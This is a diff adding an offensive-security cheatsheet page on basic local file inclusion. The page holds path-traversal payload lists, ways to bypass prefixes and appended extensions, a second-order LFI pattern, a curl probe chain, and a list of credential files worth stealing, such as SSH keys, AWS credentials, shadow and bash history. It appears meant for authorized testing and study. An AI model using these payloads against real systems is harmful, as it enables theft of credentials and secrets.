@@ -1,0 +1,208 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Basic LFI · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › File Inclusion</nav><h1>Basic LFI</h1><p class="cx-lede">Confirming LFI through path traversal, working around path prefixes and appended extensions, and second-order attacks via stored values.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1083</span><span class="cx-tag">D3FEND D3-FA</span><span class="cx-tag">IMPACT FileRead</span><span class="cx-tag">OWASP A05</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>Read a known file via the suspect parameter. Adjust the payload based on the path prefix, suffix, and any filtering the application does.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Absolute path - works when input is used unmodified
+?page=/etc/passwd
+
+# Relative path with traversal - works when input is appended after a directory
+?page=../../../../etc/passwd
+
+# Excess ../ is harmless - / stays / once you&#x27;re at root
+?page=../../../../../../../../etc/passwd
+
+# Windows targets
+?page=../../../../windows/win.ini
+?page=C:/Windows/System32/drivers/etc/hosts</code></pre></figure>
+<p>Success indicator: contents of the target file in the response. <code>/etc/passwd</code> shows <code>root:x:0:0:...</code> and a list of system users.</p>
+<h2 id="the-base-probe">The base probe</h2>
+<p><code>/etc/passwd</code> is the universal first move on Linux:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=/etc/passwd
+?page=../etc/passwd
+?page=../../etc/passwd
+?page=../../../etc/passwd
+?page=../../../../etc/passwd
+?page=../../../../../etc/passwd
+?page=../../../../../../etc/passwd
+?page=../../../../../../../etc/passwd</code></pre></figure>
+<p>One of these almost always works on a vulnerable Linux app. Recognizing the response:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</code></pre></figure>
+<p>Once you see this, LFI is confirmed and the rest of this section is about refining the payload.</p>
+<p>For Windows:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=C:/Windows/System32/drivers/etc/hosts
+?page=C:\Windows\win.ini
+?page=../../../../windows/win.ini</code></pre></figure>
+<h2 id="path-traversal-when-input-is-appended">Path traversal - when input is appended</h2>
+<p>The most common vulnerable pattern: input is appended after a directory prefix.</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">// Vulnerable
+include(&quot;./languages/&quot; . $_GET[&#x27;page&#x27;]);</code></pre></figure>
+<p>A naive <code>?page=/etc/passwd</code> becomes <code>./languages//etc/passwd</code> - which doesn't exist (no <code>/etc</code> directory inside <code>languages/</code>). The fix is <code>../</code> to climb out:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=../../../../etc/passwd
+                            ↓
+            ./languages/../../../../etc/passwd
+                            ↓ resolves to
+                          /etc/passwd</code></pre></figure>
+<h3 id="how-many-do-you-need">How many <code>../</code> do you need?</h3>
+<p>Enough to reach root from wherever the application is running. On Linux web apps:</p>
+<ul>
+<li><code>/var/www/html</code> → 3 levels deep → <code>../../../etc/passwd</code> is the minimum</li>
+<li><code>/srv/www/example.com/public</code> → 4 levels deep → <code>../../../../etc/passwd</code></li>
+<li><code>/opt/app</code> → 2 levels deep → <code>../../etc/passwd</code></li>
+</ul>
+<p><strong>You don't need to be precise.</strong> Once you reach <code>/</code>, additional <code>../</code> is harmless - <code>/</code> is its own parent, so <code>cd ..</code> from <code>/</code> stays at <code>/</code>. Stack 8-10 <code>../</code> and you've covered the common depths without thinking about it:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=../../../../../../../../etc/passwd</code></pre></figure>
+<p>Use the minimum that works in writeups (looks cleaner); use excess during testing (saves a probe).</p>
+<h3 id="verbose-errors-reveal-the-path">Verbose errors reveal the path</h3>
+<p>When traversal fails, PHP errors often show the full path the function tried to load:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>Warning: include(./languages/etc/passwd): failed to open stream: 
+No such file or directory in /var/www/html/index.php on line 12</code></pre></figure>
+<p>Three things in that error:
+1. The prefix being prepended: <code>./languages/</code>
+2. Your input as it was used: <code>etc/passwd</code> (without leading <code>/</code>)
+3. The script's location: <code>/var/www/html/index.php</code> - so you're 3 levels deep</p>
+<p>PHP errors in production are themselves a misconfiguration, but they're a gift when present. Refer to the error to dial in the exact <code>../</code> count.</p>
+<h2 id="path-prefix-without-separator">Path prefix without <code>/</code> separator</h2>
+<p>A trickier variant - input is concatenated without a separator:</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">// Vulnerable
+include(&quot;lang_&quot; . $_GET[&#x27;page&#x27;]);</code></pre></figure>
+<p>A <code>?page=../../../etc/passwd</code> becomes <code>lang_../../../etc/passwd</code> - invalid because <code>lang_..</code> isn't a directory.</p>
+<p>Insert a <code>/</code> at the start of your payload to make the prefix behave as a directory name:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=/../../../etc/passwd
+                ↓
+            lang_/../../../etc/passwd
+                ↓ resolves to (treating lang_ as a missing-but-traversable dir)
+            /../../../etc/passwd
+                ↓
+              /etc/passwd</code></pre></figure>
+<p>This depends on the OS / framework treating the missing <code>lang_</code> directory as traversable. It works on most Linux PHP setups; sometimes fails on stricter configurations.</p>
+<p>When it doesn't work, the path is genuinely broken and you have to find a different sink - there's no way to detach the prefix from your input cleanly when there's no separator.</p>
+<h2 id="appended-extension">Appended extension</h2>
+<p>A common pattern - the application appends <code>.php</code> (or another extension) after your input to constrain what files can be loaded:</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">include($_GET[&#x27;page&#x27;] . &quot;.php&quot;);</code></pre></figure>
+<p>A <code>?page=/etc/passwd</code> becomes <code>/etc/passwd.php</code> - doesn't exist.</p>
+<p>Modern PHP (5.3+ for null-byte, 5.4+ for path truncation, all 7.x and 8.x) makes this hard to bypass with traversal alone. Three approaches:</p>
+<ol>
+<li><strong>Accept the constraint and read only <code>.php</code> files.</strong> Useful for source disclosure via <a href="../php-filters/index.html">PHP filters</a>.</li>
+<li><strong>Use a PHP wrapper that doesn't care about the appended extension</strong> - <a href="../wrappers/index.html"><code>data://</code></a> and <a href="../wrappers/index.html"><code>expect://</code></a> often work because the appended <code>.php</code> becomes part of the wrapper string that the wrapper ignores.</li>
+<li><strong>Old PHP only (≤5.3)</strong> - null-byte injection or path truncation (see <a href="../filter-bypasses/index.html">Filter bypasses</a>).</li>
+</ol>
+<p>On modern PHP, the appended-extension pattern restricts you to specific file types but doesn't close LFI entirely - it just changes what attacks work.</p>
+<h2 id="absolute-paths-when-no-prefix">Absolute paths when no prefix</h2>
+<p>When the application uses your input as-is (no prefix, no suffix), absolute paths work directly:</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">include($_GET[&#x27;page&#x27;]);</code></pre></figure>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=/etc/passwd                    → /etc/passwd directly
+?page=/var/www/html/config.php       → loads config.php
+?page=C:/Windows/win.ini             → Windows</code></pre></figure>
+<p>No <code>../</code> needed. Test this form first if you don't yet know what the application does with your input.</p>
+<h2 id="high-value-files-to-read">High-value files to read</h2>
+<p>After confirming with <code>/etc/passwd</code>, expand into the targets that actually matter:</p>
+<h3 id="linux">Linux</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>/etc/passwd                                  # users (confirmation classic)
+/etc/shadow                                  # password hashes - usually only root-readable
+/etc/hosts                                   # network neighbors
+/etc/issue                                   # OS version
+/etc/os-release                              # OS details
+/etc/crontab                                 # scheduled tasks → privesc targets
+/etc/sudoers                                 # who can sudo what
+/proc/self/environ                           # env vars of current process - sometimes RCE-able
+/proc/version                                # kernel version
+/proc/self/cmdline                           # current process arguments
+/proc/&lt;PID&gt;/cmdline                          # other processes
+
+# Application config
+/var/www/html/config.php                     # PHP apps - DB creds, secrets
+/var/www/html/.env                           # framework-style env files
+/var/www/html/wp-config.php                  # WordPress
+/var/www/html/configuration.php              # Joomla
+/var/www/html/sites/default/settings.php     # Drupal
+
+# User home directories
+/root/.ssh/id_rsa                            # root&#x27;s SSH key (gold)
+/root/.bash_history                          # root&#x27;s command history
+/home/&lt;user&gt;/.ssh/id_rsa                     # user SSH keys
+/home/&lt;user&gt;/.bash_history                   # what they typed
+/home/&lt;user&gt;/.aws/credentials                # AWS keys
+/home/&lt;user&gt;/.docker/config.json             # Docker registry creds
+
+# Server logs (for log poisoning - see that page)
+/var/log/apache2/access.log
+/var/log/nginx/access.log
+/var/log/auth.log</code></pre></figure>
+<h3 id="windows">Windows</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>C:\Windows\System32\drivers\etc\hosts       # hosts file
+C:\Windows\win.ini                          # legacy config (confirmation classic)
+C:\boot.ini                                 # legacy boot config at the system-partition root - another classic
+C:\Windows\System32\inetsrv\config\applicationHost.config   # IIS config
+C:\inetpub\wwwroot\web.config               # ASP.NET app config
+C:\Users\&lt;user&gt;\.ssh\id_rsa                 # SSH key if OpenSSH installed
+C:\xampp\apache\conf\httpd.conf             # XAMPP</code></pre></figure>
+<h2 id="second-order-lfi">Second-order LFI</h2>
+<p>Sometimes the operator can't directly pass a path - but the application stores a user-controlled value and later uses it as a path. For example:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>1. User registers with username &quot;../../../etc/passwd&quot;
+2. Application stores the malicious username in the database
+3. Later, a different feature loads /profile/&lt;username&gt;/avatar.png
+4. The avatar-loader fetches /profile/../../../etc/passwd/avatar.png
+5. Some path normalization gives /etc/passwd/avatar.png - still fails
+6. But /profile/&lt;../../../etc/passwd&gt;/profile.json might succeed depending on the join logic</code></pre></figure>
+<p>The pattern: poison a stored field with traversal sequences, then trigger a code path that uses that field as part of a file path.</p>
+<p><strong>Detection</strong>: register / configure accounts with usernames, paths, or identifiers containing <code>../</code>. Watch for any subsequent feature that loads "your X" by name - avatars, exports, "download my data," report files. If the feature returns unexpected content, second-order LFI is likely.</p>
+<p><strong>Operationally relevant fields to test:</strong></p>
+<ul>
+<li>Username</li>
+<li>Display name</li>
+<li>Filename (in upload features that preserve the name)</li>
+<li>File extension (some apps build paths like <code>/uploads/&lt;id&gt;.&lt;ext&gt;</code>)</li>
+<li>Profile picture name</li>
+<li>Export-format selectors</li>
+<li>Theme / template name preferences</li>
+</ul>
+<p>The bug shows up most often in features that the development team added "later" - original code was carefully written, but the new export feature reuses fields the original code never expected to contain path-traversal sequences.</p>
+<h2 id="probing-checklist">Probing checklist</h2>
+<p>When testing a candidate parameter, work through these in order:</p>
+<ol>
+<li><strong>Reflection test</strong> - does the parameter affect the response at all? Change the value, observe the response change. If no change, the parameter isn't being used.</li>
+<li><strong>Path-shaped values</strong> - try <code>index.php</code>, <code>../index.php</code>, <code>/etc/passwd</code>. Verbose errors reveal the path structure.</li>
+<li><strong>Adjust the traversal count</strong> - work from <code>../../etc/passwd</code> up to <code>../../../../../../etc/passwd</code> if needed.</li>
+<li><strong>Try prefix-detachment</strong> - start with <code>/</code> to defeat naive prefix concatenation.</li>
+<li><strong>Check appended extension</strong> - if <code>.php</code> is appended, try <code>php://filter</code> (see <a href="../php-filters/index.html">PHP filters</a>).</li>
+<li><strong>Try other extensions</strong> - if a directory is prepended, the same payload structure works for any included content type.</li>
+</ol>
+<p>A typical successful chain on a vulnerable target:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Probe - file does not exist with current path structure
+curl &#x27;https://target.example.com/?page=/etc/passwd&#x27;
+
+# Error reveals the path
+# &gt; include(/var/www/html/languages//etc/passwd): failed to open stream
+
+# Adjust - climb out of /var/www/html/languages
+curl &#x27;https://target.example.com/?page=../../../etc/passwd&#x27;
+
+# &gt; root:x:0:0:root:/root:/bin/bash  &lt;- success</code></pre></figure>
+<h2 id="detection-only-payloads">Detection-only payloads</h2>
+<p>Probes that confirm LFI without committing to a deep exploit chain:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=/etc/passwd                            # Linux
+?page=C:/Windows/win.ini                     # Windows
+?page=../etc/passwd                          # single traversal
+?page=../../../../etc/passwd                 # several
+?page=php://filter/resource=index            # the page including itself, if rendering ≠ source</code></pre></figure>
+<p>The cleanest single-shot LFI probe is <code>/etc/hosts</code> - small, present everywhere, recognizable format (<code>127.0.0.1 localhost</code>), and the response will fit in a single HTTP body without paging.</p>
+<h2 id="notes">Notes</h2>
+<ul>
+<li><strong>Verbose errors are configuration mistakes.</strong> Production apps shouldn't surface PHP errors - when they do, it's a finding in its own right, separate from the LFI. Mention both in reports.</li>
+<li><strong>Read access only.</strong> This page covers the read-anything primitive. Turning that into code execution requires the function to <em>execute</em> the loaded file (PHP <code>include</code>, NodeJS <code>res.render</code>, etc.) - see the <a href="../index.html">overview</a> table.</li>
+<li><strong>OS detection from one probe.</strong> <code>/etc/passwd</code> only works on Linux/Unix; <code>C:\Windows\win.ini</code> only on Windows. Trying both early identifies the OS before you commit to OS-specific follow-ups.</li>
+<li><strong>Bash history is underrated.</strong> <code>~/.bash_history</code> for whatever user runs the app frequently contains passwords typed at command lines, MySQL passwords passed via <code>mysql -p&lt;password&gt;</code>, and full sudo commands. Read this on any successful LFI before pivoting.</li>
+</ul>
+<div class="cx-aside cx-tip">
+<p class="cx-aside-title">Tip</p>
+<p>The 30-second LFI check on any candidate parameter: try <code>../../../../../../etc/passwd</code> and look at the response. If you see <code>root:x:0:0:...</code> the bug is confirmed and worth investing in. If you see a verbose path error, read the error and adjust. If you see nothing different from a benign value, this parameter probably isn't vulnerable - move to the next one.</p>
+</div></article><nav class="cx-pager"><a class="cx-prev" href="../index.html">Previous: File Inclusion</a><a class="cx-next" href="../filter-bypasses/index.html">Next: Filter bypasses</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
